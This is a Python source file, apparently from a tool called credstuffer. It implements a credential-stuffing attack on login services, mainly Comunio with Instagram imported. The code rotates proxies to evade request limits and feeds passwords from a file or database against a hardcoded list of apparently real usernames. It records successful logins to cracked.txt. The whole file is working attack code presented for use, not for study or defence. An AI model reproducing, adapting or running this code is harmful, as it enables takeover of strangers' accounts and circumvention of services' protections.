import logging
import threading
from multiprocessing import Process
from credstuffer import UserAccount
from credstuffer.logins import Comunio, Instagram, Facebook
from credstuffer.proxy import Proxy
from credstuffer.dbhandler import DBHandler
from credstuffer.exceptions import ProxyMaxRequestError, ProxyBadConnectionError
from credstuffer import ROOT_DIR

usernames = [
    "shagattack",
    #"Gandi",
    #"Alki 90",
    #"seitzfabi",
    #"Cologne881",
    #"Dömers123",
    #"Mes35904",
    #"alexvögerl",
    #"seitzdani",
    #"Michl85",
    "bierschi"
]


class Stuffing(DBHandler):
    """ class Stuffing to execute the credential stuffing algorithm

    USAGE:
            stuffing = Stuffing()

    """
    def __init__(self, filepath=None, **dbparams):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class Stuffing')

        # init base class
        super().__init__(**dbparams)

        self.accounts = []
        # create account instances
        self.comunio = Comunio(max_requests=50000)
        self.instagram = Instagram()
        self.accounts.append(self.comunio)
        #self.accounts.append(self.instagram)

        self.proxy = Proxy(timeout_ms=50)
        self.http_str = 'http://'
        self.https_str = 'https://'

        self.filepath = filepath

    def get_proxy_dict(self):
        """

        :return:
        """
        proxy = self.proxy.get()
        http_proxy = self.http_str + proxy
        #https_proxy = self.https_str + proxy
        return {'http': http_proxy}

    def set_proxy(self, account):
        """

        :param account:
        :return:
        """
        try:
            account.set_proxy(proxy=self.get_proxy_dict())
        except ProxyBadConnectionError as e:
            self.set_proxy(account)

    def execute_login(self, account, username, password):
        """

        :return:
        """
        try:
            response = account.login(username, password)

            if response is not None:
                self.logger.info("response code: {}".format(response.status_code))
                if response.status_code == 200:
                    with open(ROOT_DIR + '/cracked.txt', 'w') as file:
                        file.write("username: {}, password: {}".format(username, password))

        except (ProxyMaxRequestError, ProxyBadConnectionError, ProxyBadConnectionError) as e:
            self.set_proxy(account=account)
            self.execute_login(account=account, username=username, password=password)

    def run(self):
        """

        :return:
        """
        processes = []
        for account in self.accounts:
            # handle user accounts
            if isinstance(account, UserAccount):

                for username in usernames:
                    print(username)
                    proc = Process(target=self.worker_login, args=(account, username))
                    processes.append(proc)
                    proc.start()
            # handle email accounts
            else:
                pass
                #response = account.login('bierschi', 'test')

    def worker_login(self, account, username):
        """

        :param account:
        :param username:
        :return:
        """

        # set proxy
        self.set_proxy(account=account)

        if self.filepath is not None:
            # get passwords from file
            with open(self.filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip('\n')
                    # execute login
                    self.execute_login(account=account, username=username, password=password)

        else:
            # get passwords from database
            # iterate over schema
            #for c_schema in self.schema_list:
            #    for c_table in self.schema_list:
            #        passwords_data = self.fetch_data(schema=c_schema, table=c_table)
            #        for el in passwords_data:
            #            print(el)
            passwords_data = self.fetch_data(schema="a", table="g")
            for el in passwords_data:
                print(el)

if __name__ == '__main__':
    stuf = Stuffing()
    stuf.run()
